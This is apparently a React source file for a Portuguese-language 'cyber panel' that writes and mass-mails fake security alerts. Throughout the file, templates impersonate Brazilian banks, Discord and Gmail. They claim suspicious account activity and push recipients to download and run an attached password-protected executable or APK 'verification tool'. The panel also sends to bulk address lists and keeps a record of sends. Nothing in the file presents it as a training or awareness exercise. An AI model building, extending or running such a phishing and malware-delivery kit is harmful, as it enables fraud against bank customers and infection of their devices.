"use client"

import type React from "react"

import { useState } from "react"

export default function SecurityAlertsPanel() {
  const [currentAlertType, setCurrentAlertType] = useState("urgente")
  const [alertsSent, setAlertsSent] = useState(0)
  const [alertsToday, setAlertsToday] = useState(0)
  const [alertHistory, setAlertHistory] = useState<any[]>([])
  const [uploadedFile, setUploadedFile] = useState<File | null>(null)
  const [sending, setSending] = useState(false)
  const [selectedTemplate, setSelectedTemplate] = useState("bradescu")
  const [bulkEmailFile, setBulkEmailFile] = useState<File | null>(null)
  const [bulkEmailList, setBulkEmailList] = useState<string[]>([])
  const [sendingBulk, setSendingBulk] = useState(false)
  const [bulkProgress, setBulkProgress] = useState({ sent: 0, total: 0 })
  const [formData, setFormData] = useState({
    companyName: "Bradescu",
    recipientName: "",
    recipientEmail: "",
    alertTitle: "Alerta Urgente de Segurança",
    mainMessage:
      "Recebemos um alerta sobre atividades suspeitas em sua conta. Por medidas de segurança, seu acesso pode ser temporariamente restrito.",
    actionMessage:
      "Atualização de Segurança Obrigatória: Baixe a ferramenta em anexo para verificar sua conta e restabelecer o acesso. Senha: Bradescu20.",
    buttonText: "Baixar a Ferramenta",
    downloadLink: "https://exemplo.com/ferramenta-seguranca.exe",
    contactInfo: "0800-123-456",
    primaryColor: "#003d7a",
    accentColor: "#fef3c7",
    companyFooter: "Bradescu S.A.",
    contactMessage: "Em caso de dúvidas, entre em contato imediatamente pelo telefone oficial do banco:", // Adicionando campo para mensagem de contato editável
  })

  const templates = {
    bradescu: {
      company: "Bradescu",
      title: "Alerta Urgente de Segurança",
      message:
        "Recebemos um alerta sobre atividades suspeitas em sua conta. Por medidas de segurança, seu acesso pode ser temporariamente restrito.",
      action:
        "Atualização de Segurança Obrigatória: Baixe a ferramenta em anexo para verificar sua conta e restabelecer o acesso. Senha: Bradescu20.",
      button: "Baixar a Ferramenta",
      contact: "0800-123-456",
      color: "#003d7a",
    },
    itau: {
      company: "Itaú",
      title: "Verificação de Segurança Necessária",
      message:
        "Identificamos uma tentativa de acesso não autorizado em sua conta. Para sua proteção, é necessário realizar uma verificação imediata.",
      action:
        "Ação Imediata Requerida: Execute a ferramenta de verificação anexada para confirmar sua identidade. Código de acesso: Itau2025.",
      button: "Verificar Agora",
      contact: "0800-728-0728",
      color: "#ec7000",
    },
    bb: {
      company: "Banco do Brasil",
      title: "Atualização de Segurança Obrigatória",
      message:
        "O Banco do Brasil detectou movimentações atípicas em sua conta. Uma atualização de segurança é necessária para manter seu acesso ativo.",
      action:
        "Atualização Obrigatória: Instale a ferramenta de segurança anexada para regularizar sua conta. Senha de instalação: BB2025.",
      button: "Instalar Atualização",
      contact: "4004-0001",
      color: "#003d7a",
    },
    caixa: {
      company: "Caixa Econômica",
      title: "Bloqueio Preventivo de Conta",
      message:
        "Sua conta foi temporariamente bloqueada devido a atividades suspeitas detectadas pelo nosso sistema de segurança.",
      action:
        "Desbloqueio Imediato: Baixe e execute a ferramenta de desbloqueio para restaurar o acesso à sua conta. Chave: CAIXA2025.",
      button: "Desbloquear Conta",
      contact: "0800-726-0101",
      color: "#0066b3",
    },
    santander: {
      company: "Santander",
      title: "Atividade Suspeita Detectada",
      message:
        "Nosso sistema identificou transações suspeitas em sua conta. Por segurança, algumas funcionalidades foram temporariamente limitadas.",
      action:
        "Verificação Urgente: Execute a ferramenta de segurança anexada para validar sua identidade e restaurar o acesso completo. Token: SANT2025.",
      button: "Validar Identidade",
      contact: "0800-762-7777",
      color: "#ec0000",
    },
    discord: {
      company: "Discord",
      title: "Atividade Suspeita na Sua Conta",
      message:
        "Detectamos uma tentativa de login não autorizado em sua conta Discord. Para proteger seus dados e servidores, é necessário verificar sua identidade imediatamente.",
      action:
        "Verificação Obrigatória: Baixe nossa ferramenta de verificação oficial para confirmar que você é o proprietário desta conta. Código de verificação: DISC2025.",
      button: "Verificar Conta Discord",
      contact: "support@discord.com",
      color: "#5865F2",
    },
    gmail: {
      company: "Gmail Security",
      title: "Alerta de Segurança da Conta Google",
      message:
        "Identificamos atividade incomum em sua conta Gmail. Alguém pode ter acessado sua conta de um dispositivo ou local não reconhecido.",
      action:
        "Ação Necessária: Execute a ferramenta de verificação do Google para proteger sua conta e revisar atividades recentes. Token de segurança: GMAIL2025.",
      button: "Proteger Minha Conta",
      contact: "support.google.com",
      color: "#EA4335",
    },
  }

  const sendAlert = async () => {
    if (!formData.recipientEmail) {
      alert("⚠️ Por favor, insira o email do destinatário!")
      return
    }

    if (!formData.recipientEmail.includes("@")) {
      alert("⚠️ Por favor, insira um email válido!")
      return
    }

    if (!formData.downloadLink) {
      alert("⚠️ Por favor, insira o link de download da ferramenta!")
      return
    }

    setSending(true)

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          to: formData.recipientEmail,
          companyName: formData.companyName,
          recipientName: formData.recipientName,
          alertTitle: formData.alertTitle,
          mainMessage: formData.mainMessage,
          actionMessage: formData.actionMessage,
          buttonText: formData.buttonText,
          downloadLink: formData.downloadLink,
          contactInfo: formData.contactInfo,
          alertType: currentAlertType,
          templateColor: formData.primaryColor,
          accentColor: formData.accentColor,
          companyFooter: formData.companyFooter,
          contactMessage: formData.contactMessage, // Enviando mensagem de contato editável
        }),
      })

      const data = await response.json()

      if (response.ok) {
        const now = new Date()
        const historyItem = {
          email: formData.recipientEmail,
          type: currentAlertType,
          company: formData.companyName,
          time: now.toLocaleString("pt-BR"),
        }

        setAlertHistory([historyItem, ...alertHistory])
        setAlertsSent(alertsSent + 1)
        setAlertsToday(alertsToday + 1)

        alert(
          "✅ Alerta enviado com sucesso para " +
            formData.recipientEmail +
            "!\n\n📎 Link de download: " +
            formData.downloadLink +
            (uploadedFile ? "\n📄 Arquivo anexado: " + uploadedFile.name : ""),
        )

        setFormData({ ...formData, recipientEmail: "" })
      } else {
        alert("❌ Erro ao enviar email: " + (data.error || "Erro desconhecido"))
      }
    } catch (error) {
      console.error("[v0] Erro ao enviar email:", error)
      alert("❌ Erro ao enviar email. Verifique a configuração da API.")
    } finally {
      setSending(false)
    }
  }

  const loadTemplate = (templateName: string) => {
    const template = templates[templateName as keyof typeof templates]
    if (!template) return

    setSelectedTemplate(templateName)
    setFormData({
      ...formData,
      companyName: template.company,
      alertTitle: template.title,
      mainMessage: template.message,
      actionMessage: template.action,
      buttonText: template.button,
      contactInfo: template.contact,
      primaryColor: template.color,
    })
  }

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) {
      setUploadedFile(file)
    }
  }

  const handleBulkEmailFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return

    if (!file.name.endsWith(".txt")) {
      alert("⚠️ Por favor, selecione um arquivo .txt")
      return
    }

    setBulkEmailFile(file)

    // Ler o arquivo e extrair emails
    const text = await file.text()
    const emails = text
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => line && line.includes("@"))

    setBulkEmailList(emails)
  }

  const sendBulkEmails = async () => {
    if (bulkEmailList.length === 0) {
      alert("⚠️ Por favor, carregue um arquivo com emails primeiro!")
      return
    }

    if (!formData.downloadLink) {
      alert("⚠️ Por favor, configure o link de download da ferramenta!")
      return
    }

    const confirmSend = confirm(`📧 Você está prestes a enviar ${bulkEmailList.length} emails.\n\nDeseja continuar?`)

    if (!confirmSend) return

    setSendingBulk(true)
    setBulkProgress({ sent: 0, total: bulkEmailList.length })

    try {
      const response = await fetch("/api/send-bulk-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          emails: bulkEmailList,
          companyName: formData.companyName,
          recipientName: formData.recipientName,
          alertTitle: formData.alertTitle,
          mainMessage: formData.mainMessage,
          actionMessage: formData.actionMessage,
          buttonText: formData.buttonText,
          downloadLink: formData.downloadLink,
          contactInfo: formData.contactInfo,
          alertType: currentAlertType,
          templateColor: formData.primaryColor,
          accentColor: formData.accentColor,
          companyFooter: formData.companyFooter,
          contactMessage: formData.contactMessage, // Enviando mensagem de contato editável para envio em massa
        }),
      })

      const data = await response.json()

      if (response.ok) {
        setAlertsSent(alertsSent + data.successCount)
        setAlertsToday(alertsToday + data.successCount)

        alert(
          `✅ Envio em massa concluído!\n\n` +
            `📧 Enviados: ${data.successCount}\n` +
            `❌ Falhas: ${data.failureCount}\n` +
            `📊 Total: ${bulkEmailList.length}`,
        )

        // Limpar lista após envio
        setBulkEmailFile(null)
        setBulkEmailList([])
      } else {
        alert("❌ Erro no envio em massa: " + (data.error || "Erro desconhecido"))
      }
    } catch (error) {
      console.error("[v0] Erro no envio em massa:", error)
      alert("❌ Erro ao enviar emails em massa. Verifique a configuração da API.")
    } finally {
      setSendingBulk(false)
      setBulkProgress({ sent: 0, total: 0 })
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-700 p-5">
      <div className="max-w-[1600px] mx-auto">
        {/* Header */}
        <div className="bg-gradient-to-r from-blue-700 to-blue-600 rounded-2xl p-8 mb-8 shadow-2xl flex justify-between items-center border border-white/10">
          <h1 className="text-white text-3xl font-bold flex items-center gap-3">
            <span>🛡️</span>
            Painel do Cyber
          </h1>
          <div className="flex gap-5 items-center">
            <span className="bg-green-500/20 text-green-400 px-4 py-2 rounded-full text-sm font-semibold border border-green-500/30">
              ● Sistema Ativo
            </span>
            <span className="text-white/90 text-sm font-medium">👤 Administrador</span>
          </div>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-4 gap-5 mb-8">
          <div className="bg-white/95 rounded-xl p-6 shadow-lg hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex justify-between items-center mb-3">
              <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center text-xl">
                📧
              </div>
            </div>
            <div className="text-4xl font-bold text-slate-800 mb-1">{alertsSent}</div>
            <div className="text-slate-500 text-xs font-semibold uppercase tracking-wide">Total Enviados</div>
          </div>

          <div className="bg-white/95 rounded-xl p-6 shadow-lg hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex justify-between items-center mb-3">
              <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center text-xl">
                ✓
              </div>
            </div>
            <div className="text-4xl font-bold text-slate-800 mb-1">{alertsToday}</div>
            <div className="text-slate-500 text-xs font-semibold uppercase tracking-wide">Enviados Hoje</div>
          </div>

          <div className="bg-white/95 rounded-xl p-6 shadow-lg hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex justify-between items-center mb-3">
              <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-orange-500 to-orange-600 flex items-center justify-center text-xl">
                ⏱
              </div>
            </div>
            <div className="text-4xl font-bold text-slate-800 mb-1">0</div>
            <div className="text-slate-500 text-xs font-semibold uppercase tracking-wide">Pendentes</div>
          </div>

          <div className="bg-white/95 rounded-xl p-6 shadow-lg hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex justify-between items-center mb-3">
              <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500 to-purple-600 flex items-center justify-center text-xl">
                📊
              </div>
            </div>
            <div className="text-4xl font-bold text-slate-800 mb-1">100%</div>
            <div className="text-slate-500 text-xs font-semibold uppercase tracking-wide">Taxa de Sucesso</div>
          </div>
        </div>

        {/* Main Grid */}
        <div className="grid grid-cols-[380px_1fr_450px] gap-6">
          {/* Templates Panel */}
          <div className="bg-white/95 rounded-2xl p-8 shadow-lg">
            <h2 className="text-slate-800 text-xl font-bold mb-6 pb-4 border-b-2 border-slate-200 flex items-center gap-3">
              📋 Templates
            </h2>

            <div className="space-y-3 mb-6">
              {Object.entries(templates).map(([key, template]) => (
                <div
                  key={key}
                  onClick={() => loadTemplate(key)}
                  className={`bg-slate-50 border-2 rounded-lg p-4 cursor-pointer transition-all hover:border-blue-500 hover:bg-blue-50 hover:translate-x-1 ${
                    selectedTemplate === key ? "border-blue-500 bg-blue-50" : "border-slate-200"
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div
                      className="w-9 h-9 rounded-lg flex items-center justify-center font-bold text-sm text-white"
                      style={{ background: template.color }}
                    >
                      {template.company[0]}
                    </div>
                    <div>
                      <h4 className="text-slate-800 text-sm font-semibold">{template.company}</h4>
                      <p className="text-slate-500 text-xs">
                        {key === "discord"
                          ? "Alerta de segurança Discord"
                          : key === "gmail"
                            ? "Alerta de segurança Google"
                            : "Alerta de segurança bancária"}
                      </p>
                    </div>
                  </div>
                </div>
              ))}
            </div>

            <div className="mb-5">
              <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                Tipo de Alerta
              </label>
              <div className="grid grid-cols-2 gap-2">
                {[
                  { type: "urgente", icon: "⚠️", label: "Urgente" },
                  { type: "critico", icon: "🔴", label: "Crítico" },
                  { type: "importante", icon: "🟡", label: "Importante" },
                  { type: "informativo", icon: "ℹ️", label: "Informativo" },
                ].map(({ type, icon, label }) => (
                  <button
                    key={type}
                    onClick={() => setCurrentAlertType(type)}
                    className={`p-3 border-2 rounded-lg font-semibold text-sm transition-all ${
                      currentAlertType === type
                        ? "bg-gradient-to-br from-blue-500 to-blue-600 text-white border-blue-500"
                        : "bg-white border-slate-200 hover:border-blue-500 hover:bg-blue-50"
                    }`}
                  >
                    {icon} {label}
                  </button>
                ))}
              </div>
            </div>

            <div className="mb-5">
              <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                Ferramenta de Manutenção
              </label>
              <div className="bg-slate-50 border-2 border-dashed border-slate-300 rounded-lg p-5 text-center hover:border-blue-500 hover:bg-blue-50 transition-all">
                <input
                  type="file"
                  id="toolFile"
                  accept=".exe,.zip,.msi,.apk"
                  onChange={handleFileUpload}
                  className="hidden"
                />
                <label htmlFor="toolFile" className="cursor-pointer block">
                  <div className="text-3xl mb-2">📎</div>
                  <div className="text-slate-600 text-sm font-medium">Clique para anexar ferramenta</div>
                  <div className="text-slate-400 text-xs mt-1">Formatos: .exe, .zip, .msi, .apk</div>
                </label>
              </div>
              {uploadedFile && (
                <div className="bg-blue-50 border border-blue-500 rounded-lg p-3 mt-3 flex items-center gap-3">
                  <span>📄</span>
                  <span className="flex-1 text-blue-900 text-sm font-semibold">{uploadedFile.name}</span>
                  <button onClick={() => setUploadedFile(null)} className="text-xl hover:text-red-500">
                    ×
                  </button>
                </div>
              )}
            </div>

            <div className="mt-6 pt-6 border-t-2 border-slate-200">
              <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                📨 Envio em Massa
              </label>
              <div className="bg-gradient-to-br from-purple-50 to-blue-50 border-2 border-dashed border-purple-300 rounded-lg p-5 text-center hover:border-purple-500 hover:from-purple-100 hover:to-blue-100 transition-all">
                <input type="file" id="bulkEmailFile" accept=".txt" onChange={handleBulkEmailFile} className="hidden" />
                <label htmlFor="bulkEmailFile" className="cursor-pointer block">
                  <div className="text-3xl mb-2">📋</div>
                  <div className="text-slate-600 text-sm font-medium">Carregar lista de emails</div>
                  <div className="text-slate-400 text-xs mt-1">Arquivo .txt (um email por linha)</div>
                </label>
              </div>

              {bulkEmailFile && (
                <div className="mt-3 space-y-3">
                  <div className="bg-purple-50 border border-purple-500 rounded-lg p-3">
                    <div className="flex items-center gap-3 mb-2">
                      <span>📄</span>
                      <span className="flex-1 text-purple-900 text-sm font-semibold">{bulkEmailFile.name}</span>
                      <button
                        onClick={() => {
                          setBulkEmailFile(null)
                          setBulkEmailList([])
                        }}
                        className="text-xl hover:text-red-500"
                      >
                        ×
                      </button>
                    </div>
                    <div className="text-purple-700 text-xs font-semibold">
                      📧 {bulkEmailList.length} emails encontrados
                    </div>
                  </div>

                  <div className="max-h-32 overflow-y-auto bg-slate-50 border border-slate-200 rounded-lg p-3">
                    {bulkEmailList.slice(0, 10).map((email, index) => (
                      <div key={index} className="text-xs text-slate-600 py-1">
                        {email}
                      </div>
                    ))}
                    {bulkEmailList.length > 10 && (
                      <div className="text-xs text-slate-400 py-1 italic">
                        ... e mais {bulkEmailList.length - 10} emails
                      </div>
                    )}
                  </div>

                  <button
                    onClick={sendBulkEmails}
                    disabled={sendingBulk}
                    className="w-full bg-gradient-to-r from-purple-500 to-purple-600 text-white p-3 rounded-lg text-sm font-semibold shadow-lg hover:-translate-y-0.5 hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {sendingBulk ? (
                      <>
                        📤 Enviando... ({bulkProgress.sent}/{bulkProgress.total})
                      </>
                    ) : (
                      <>📨 Enviar para {bulkEmailList.length} destinatários</>
                    )}
                  </button>
                </div>
              )}
            </div>

            <div className="mt-6 border-t-2 border-slate-200 pt-6">
              <a
                href="/html-processor"
                className="block w-full rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 p-4 text-center text-sm font-semibold text-white shadow-lg transition-all hover:-translate-y-0.5 hover:from-blue-700 hover:to-indigo-700 hover:shadow-xl"
              >
                Abrir processador de HTML de emails
              </a>
              <p className="mt-2 text-center text-xs text-slate-500">
                Identifique e revise títulos, textos, links e imagens de emails já criados.
              </p>
            </div>
          </div>

          {/* Form Panel */}
          <div className="bg-white/95 rounded-2xl p-8 shadow-lg">
            <h2 className="text-slate-800 text-xl font-bold mb-6 pb-4 border-b-2 border-slate-200 flex items-center gap-3">
              ✏️ Criar Novo Alerta
            </h2>

            <div className="space-y-5">
              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Nome da Empresa/Banco
                </label>
                <input
                  type="text"
                  value={formData.companyName}
                  onChange={(e) => setFormData({ ...formData, companyName: e.target.value })}
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Nome do Destinatário
                </label>
                <input
                  type="text"
                  value={formData.recipientName}
                  onChange={(e) => setFormData({ ...formData, recipientName: e.target.value })}
                  placeholder="João Silva"
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Email do Destinatário
                </label>
                <input
                  type="email"
                  value={formData.recipientEmail}
                  onChange={(e) => setFormData({ ...formData, recipientEmail: e.target.value })}
                  placeholder="cliente@exemplo.com"
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                    Cor Primária
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="color"
                      value={formData.primaryColor}
                      onChange={(e) => setFormData({ ...formData, primaryColor: e.target.value })}
                      className="w-14 h-11 border-2 border-slate-200 rounded-lg cursor-pointer"
                    />
                    <input
                      type="text"
                      value={formData.primaryColor}
                      onChange={(e) => setFormData({ ...formData, primaryColor: e.target.value })}
                      className="flex-1 p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                    Cor de Destaque
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="color"
                      value={formData.accentColor}
                      onChange={(e) => setFormData({ ...formData, accentColor: e.target.value })}
                      className="w-14 h-11 border-2 border-slate-200 rounded-lg cursor-pointer"
                    />
                    <input
                      type="text"
                      value={formData.accentColor}
                      onChange={(e) => setFormData({ ...formData, accentColor: e.target.value })}
                      className="flex-1 p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                    />
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Título do Alerta
                </label>
                <input
                  type="text"
                  value={formData.alertTitle}
                  onChange={(e) => setFormData({ ...formData, alertTitle: e.target.value })}
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Mensagem Principal
                </label>
                <textarea
                  value={formData.mainMessage}
                  onChange={(e) => setFormData({ ...formData, mainMessage: e.target.value })}
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 min-h-[90px] resize-y"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Ação Obrigatória (Destacada)
                </label>
                <textarea
                  value={formData.actionMessage}
                  onChange={(e) => setFormData({ ...formData, actionMessage: e.target.value })}
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 min-h-[90px] resize-y"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Texto do Botão
                </label>
                <input
                  type="text"
                  value={formData.buttonText}
                  onChange={(e) => setFormData({ ...formData, buttonText: e.target.value })}
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Link de Download
                </label>
                <input
                  type="url"
                  value={formData.downloadLink}
                  onChange={(e) => setFormData({ ...formData, downloadLink: e.target.value })}
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Informações de Contato
                </label>
                <input
                  type="text"
                  value={formData.contactInfo}
                  onChange={(e) => setFormData({ ...formData, contactInfo: e.target.value })}
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Mensagem de Contato
                </label>
                <textarea
                  value={formData.contactMessage}
                  onChange={(e) => setFormData({ ...formData, contactMessage: e.target.value })}
                  placeholder="Em caso de dúvidas, entre em contato imediatamente pelo telefone oficial do banco:"
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 min-h-[70px] resize-y"
                />
              </div>

              <div>
                <label className="block text-slate-700 font-semibold mb-2 text-xs uppercase tracking-wide">
                  Nome da Empresa (Footer)
                </label>
                <input
                  type="text"
                  value={formData.companyFooter}
                  onChange={(e) => setFormData({ ...formData, companyFooter: e.target.value })}
                  placeholder="Bradescu S.A."
                  className="w-full p-3 border-2 border-slate-200 rounded-lg text-sm focus:outline-none focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10"
                />
              </div>

              <button
                onClick={sendAlert}
                disabled={sending}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white p-4 rounded-lg text-base font-semibold shadow-lg hover:-translate-y-0.5 hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {sending ? "📤 Enviando..." : "📧 Enviar Alerta"}
              </button>
            </div>
          </div>

          {/* Preview Panel */}
          <div className="bg-white/95 rounded-2xl p-8 shadow-lg">
            <h2 className="text-slate-800 text-xl font-bold mb-6 pb-4 border-b-2 border-slate-200 flex items-center gap-3">
              👁️ Preview do Email
            </h2>

            <div className="border-2 border-slate-200 rounded-xl overflow-hidden shadow-lg mb-6">
              <div className="p-10 text-center" style={{ background: formData.primaryColor }}>
                <div className="text-white text-4xl font-bold tracking-tight">{formData.companyName}</div>
              </div>

              <div className="bg-white p-10">
                <div className="text-center mb-7 pb-5 border-b-2 border-slate-100">
                  <div className="w-16 h-16 bg-yellow-400 rounded-full inline-flex items-center justify-center text-3xl mb-4 shadow-lg">
                    ⚠️
                  </div>
                  <h3 className="text-gray-900 text-2xl font-bold leading-tight">{formData.alertTitle}</h3>
                </div>

                <div className="text-gray-600 leading-relaxed space-y-4">
                  <p>
                    <strong>Prezado {formData.recipientName || "cliente"},</strong>
                  </p>
                  <p>{formData.mainMessage}</p>

                  <div
                    className="border-l-4 p-6 my-7 rounded-lg shadow-sm"
                    style={{
                      backgroundColor: formData.accentColor,
                      borderLeftColor: formData.primaryColor,
                    }}
                  >
                    <p className="text-gray-900 leading-relaxed">
                      <strong>⚠️ {formData.actionMessage}</strong>
                    </p>
                  </div>

                  <p>
                    Este procedimento é essencial para proteger seus dados contra possíveis acessos não autorizados.
                  </p>

                  <div className="text-center my-6">
                    <a
                      href={formData.downloadLink}
                      className="inline-block text-white px-10 py-4 rounded-lg font-bold shadow-lg hover:-translate-y-0.5 hover:shadow-xl transition-all"
                      style={{ background: formData.primaryColor }}
                    >
                      {formData.buttonText}
                    </a>
                  </div>

                  <p>
                    {formData.contactMessage} <strong>{formData.contactInfo}</strong>.
                  </p>
                </div>
              </div>

              <div className="bg-slate-50 p-8 text-center text-slate-500 text-sm leading-relaxed border-t border-slate-200">
                <p>Este é um e-mail automático. Não responda a esta mensagem.</p>
                <p className="mt-1">
                  <strong>{formData.companyFooter}</strong> © 2025
                </p>
              </div>
            </div>

            {/* History */}
            <div>
              <h2 className="text-base font-bold mb-4">📜 Histórico Recente</h2>
              <div className="max-h-[600px] overflow-y-auto">
                {alertHistory.length === 0 ? (
                  <div className="text-center text-slate-400 py-10">
                    <div className="text-5xl mb-3">📭</div>
                    <p>Nenhum alerta enviado ainda</p>
                  </div>
                ) : (
                  <div className="space-y-3">
                    {alertHistory.map((item, index) => (
                      <div
                        key={index}
                        className="bg-slate-50 border border-slate-200 rounded-lg p-4 hover:bg-blue-50 hover:border-blue-500 transition-all"
                      >
                        <div className="flex justify-between items-center mb-2">
                          <span className="text-slate-800 font-semibold text-sm">{item.email}</span>
                          <span className="text-slate-500 text-xs">{item.time}</span>
                        </div>
                        <div>
                          <span
                            className={`inline-block px-2 py-1 rounded text-xs font-semibold ${
                              item.type === "urgente"
                                ? "bg-red-100 text-red-800"
                                : item.type === "critico"
                                  ? "bg-yellow-100 text-yellow-800"
                                  : item.type === "importante"
                                    ? "bg-blue-100 text-blue-800"
                                    : "bg-indigo-100 text-indigo-800"
                            }`}
                          >
                            {item.type.toUpperCase()}
                          </span>
                          <span className="text-slate-500 text-xs ml-2">{item.company}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
